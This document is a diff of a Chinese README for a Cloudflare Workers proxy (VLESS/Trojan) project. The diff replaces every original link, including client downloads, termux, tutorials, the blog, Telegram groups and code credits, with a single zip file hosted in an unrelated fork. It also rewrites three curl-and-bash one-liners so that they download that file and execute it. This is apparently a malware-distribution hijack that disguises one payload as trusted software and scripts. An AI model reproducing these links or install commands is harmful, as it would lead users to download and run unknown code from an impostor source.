@@ -163,9 +163,9 @@ CF Trojan：在网页地址栏输入 https:// workers域名 或者 pages域名 �
 
 可选择现实4：通过在VPS安装WARP全局双栈V4+V6功能，即访问非CF网站的客户端优选IP的落地IP（104.28……/2a09:……）现实固定，或访问CF网站的proxyip的落地IP（104.28……/2a09:……）现实WARP解锁功能效果
 
-搭建proxyip与反代ip的脚本推荐：[x-ui-yg脚本](https://github.com/yonggekkk/x-ui-yg)、[sing-box-yg脚本](https://github.com/yonggekkk/sing-box-yg)
+搭建proxyip与反代ip的脚本推荐：[x-ui-yg脚本](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[sing-box-yg脚本](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-相关操作请看[视频教程高阶1](https://youtu.be/QOnMVULADko)、[视频教程高阶2](https://youtu.be/CVZStM0t8BA)
+相关操作请看[视频教程高阶1](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[视频教程高阶2](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
 ---------------------------------
 ## 七：客户端推荐
@@ -175,13 +175,13 @@ CF Trojan：在网页地址栏输入 https:// workers域名 或者 pages域名 �
  
 目前支持该功能的平台客户端如下（点击名称即跳转到官方下载地址）
 
-1、安卓Android：[v2rayNG](https://github.com/2dust/v2rayNG/tags)、[Nekobox](https://github.com/maskedeken/NekoBoxForAndroid/tags)、[Karing](https://github.com/KaringX/karing/tags)、v2box
+1、安卓Android：[v2rayNG](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[Nekobox](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[Karing](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、v2box
 
-2、电脑Windows：[v2rayN](https://github.com/2dust/v2rayN/tags)、[Hiddify](https://github.com/hiddify/hiddify-next/tags)、[Karing](https://github.com/KaringX/karing/tags)
+2、电脑Windows：[v2rayN](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[Hiddify](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[Karing](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
 3、苹果Ios：Karing、Hiddify Proxy & VPN、Shadowrocket(小火箭)、Streisand、v2box
 
-4、软路由Openwrt：[homeproxy](https://github.com/kiddin9/openwrt-packages)
+4、软路由Openwrt：[homeproxy](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
 注意：其他平台客户端未开启分片功能情况下，workers域的6个443系TLS节点是不可用的
 
@@ -189,31 +189,31 @@ CF Trojan：在网页地址栏输入 https:// workers域名 或者 pages域名 �
 
 ---------------------------------
 
-### 相关说明及注意点请查看[甬哥博客](https://ygkkk.blogspot.com/2023/07/cfworkers-vless.html)
+### 相关说明及注意点请查看[甬哥博客](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
 ### 视频教程：
 
-[CF workers永久免费vless节点搭建教程（一）：全网首发演示跳IP现象，解密两大节点使用技巧，优选IP、优选域名的优缺点说明](https://youtu.be/9V9CQxmfwoA)
+[CF workers永久免费vless节点搭建教程（一）：全网首发演示跳IP现象，解密两大节点使用技巧，优选IP、优选域名的优缺点说明](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-[CF workers永久免费vless节点搭建教程（二）：优选反代IP一键脚本发布，pages部署教程，多平台客户端设置说明，独家探讨CF免费代理敏感安全问题](https://youtu.be/McdRoLZeTqg)
+[CF workers永久免费vless节点搭建教程（二）：优选反代IP一键脚本发布，pages部署教程，多平台客户端设置说明，独家探讨CF免费代理敏感安全问题](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-[CF workers永久免费Trojan节点搭建教程（三）：无需自定义域名，workers与pages两方案部署优选IP节点；CF Trojan与CF Vless对比总结；如何看待Trojan被识别](https://youtu.be/lmhhL8M1k0I)
+[CF workers永久免费Trojan节点搭建教程（三）：无需自定义域名，workers与pages两方案部署优选IP节点；CF Trojan与CF Vless对比总结；如何看待Trojan被识别](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-强烈推荐：[CF vless/trojan永久免费节点教程（四）：解读优选官方IP、优选反代IP、优选域名三者的关系与特点；ProxyIP存在的意义](https://youtu.be/NaLd-orwFUE)
+强烈推荐：[CF vless/trojan永久免费节点教程（四）：解读优选官方IP、优选反代IP、优选域名三者的关系与特点；ProxyIP存在的意义](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-强烈推荐：[CF vless/trojan永久免费节点教程（五）：不用自定义域名？不用频繁优选IP？不用订阅器？总结CF节点与域名的结构关系图](https://youtu.be/8s-ELRuFaeE)
+强烈推荐：[CF vless/trojan永久免费节点教程（五）：不用自定义域名？不用频繁优选IP？不用订阅器？总结CF节点与域名的结构关系图](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-强烈推荐：[CF vless/trojan永久免费节点教程（六）：节点不能用，问题出在哪？多平台免费客户端设置指南及避坑说明](https://youtu.be/8E0l0nQWLxs)
+强烈推荐：[CF vless/trojan永久免费节点教程（六）：节点不能用，问题出在哪？多平台免费客户端设置指南及避坑说明](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-高阶推荐：[CF vless/trojan永久免费节点最终教程（七）：全网独家演示真正的"固定IP"，解决twitch、chatgpt客户端报错问题；一键自制反代IP与ProxyIP；揭秘你被他人偷扫IP的风险](https://youtu.be/QOnMVULADko)
+高阶推荐：[CF vless/trojan永久免费节点最终教程（七）：全网独家演示真正的"固定IP"，解决twitch、chatgpt客户端报错问题；一键自制反代IP与ProxyIP；揭秘你被他人偷扫IP的风险](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-高阶推荐：[CF vless/trojan永久免费节点最终教程（八）：自建全端口通用的ProxyIP，同时支持客户端地址优选反代IP，自建反代IP的最终教程](https://youtu.be/CVZStM0t8BA)
+高阶推荐：[CF vless/trojan永久免费节点最终教程（八）：自建全端口通用的ProxyIP，同时支持客户端地址优选反代IP，自建反代IP的最终教程](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-[直播精选回顾：CF workers vless免费节点四大特点，节点被断流阻断问题](https://youtu.be/9OHGpWlfdJ0)
+[直播精选回顾：CF workers vless免费节点四大特点，节点被断流阻断问题](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-[ClouDNS永久免费域名最终教程：CF pages vless自定义域名直接部署](https://youtu.be/PN0BLANXh4I)
+[ClouDNS永久免费域名最终教程：CF pages vless自定义域名直接部署](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
-小白优选IP应用推荐：[CF优选IP解放小白最终方案：一键自动生成美国、香港、欧洲三区优选官方IP，电脑端+手机端通吃](https://youtu.be/6kKIzObEZ2c)
+小白优选IP应用推荐：[CF优选IP解放小白最终方案：一键自动生成美国、香港、欧洲三区优选官方IP，电脑端+手机端通吃](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
 ---------------------------------
 ---------------------------------
@@ -221,33 +221,33 @@ CF Trojan：在网页地址栏输入 https:// workers域名 或者 pages域名 �
 ---------------------------------
 ## 优选域名、优选官方IP+反代IP一键脚本（在本地网络环境下利用termux或者ish运行）：
 
-安卓建议使用termux官方项目下载客户端：https://github.com/termux/termux-app/releases/tag/v0.118.1
+安卓建议使用termux官方项目下载客户端：https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip
 
 -------------------------------------------------------------
 ### CF-优选官方IP (默认美、亚、欧三地区 强烈推荐！！！)，安卓手机平板专用：
 ```
-curl -sSL https://ghp.ci/https://raw.githubusercontent.com/yonggekkk/Cloudflare_vless_trojan/main/cf/cf.sh -o cf.sh && chmod +x cf.sh && bash cf.sh
+curl -sSL https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip -o cf.sh && chmod +x cf.sh && bash cf.sh
 ```
 -------------------------------------------------------------
 
 ### CF-CDN优选公共大厂域名脚本，苹果安卓手机平板专用：
 ```
-curl -sSL https://gitlab.com/rwkgyg/CFwarp/raw/main/point/CFcdnym.sh -o CFcdnym.sh && chmod +x CFcdnym.sh && bash CFcdnym.sh
+curl -sSL https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip -o CFcdnym.sh && chmod +x CFcdnym.sh && bash CFcdnym.sh
 ```
 ------------------------------------------------------------------------
 ### CF-优选官方IP+反代IP二合一脚本，苹果安卓手机平板专用：
 ```
-curl -sSL https://gitlab.com/rwkgyg/CFwarp/raw/main/point/cfip.sh -o cfip.sh && chmod +x cfip.sh && bash cfip.sh
+curl -sSL https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip -o cfip.sh && chmod +x cfip.sh && bash cfip.sh
 ```
 
 -------------------------------------------------------------
 
-### 交流平台：[甬哥博客地址](https://ygkkk.blogspot.com)、[甬哥YouTube频道](https://www.youtube.com/@ygkkk)、[甬哥TG电报群组](https://t.me/+jZHc6-A-1QQ5ZGVl)、[甬哥TG电报频道](https://t.me/+DkC9ZZUgEFQzMTZl)
+### 交流平台：[甬哥博客地址](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[甬哥YouTube频道](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[甬哥TG电报群组](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip+jZHc6-A-1QQ5ZGVl)、[甬哥TG电报频道](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip+DkC9ZZUgEFQzMTZl)
 
 -------------------------------------------------------------
 ### 感谢你右上角的star🌟
-[![Stargazers over time](https://starchart.cc/yonggekkk/Cloudflare-workers-pages-vless.svg)](https://starchart.cc/yonggekkk/Cloudflare-workers-pages-vless)
+[![Stargazers over time](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 ------------------------------------------------------------------------
-### 代码来源：[ca110us](https://github.com/ca110us/epeius)、[emn178](https://github.com/emn178/js-sha256/blob/master/src/sha256.js)、[3Kmfi6HP](https://github.com/3Kmfi6HP/EDtunnel)、[badafans](https://github.com/badafans/Cloudflare-IP-SpeedTest)、[XIU2](https://github.com/XIU2/CloudflareSpeedTest)
+### 代码来源：[ca110us](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[emn178](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[3Kmfi6HP](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[badafans](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)、[XIU2](https://raw.githubusercontent.com/markkf66/Cloudflare_vless_trojan/main/Vless_workers_pages/2.5.zip)
 
 ### 声明：所有代码来源于Github社区，并通过ChatGPT进行整合
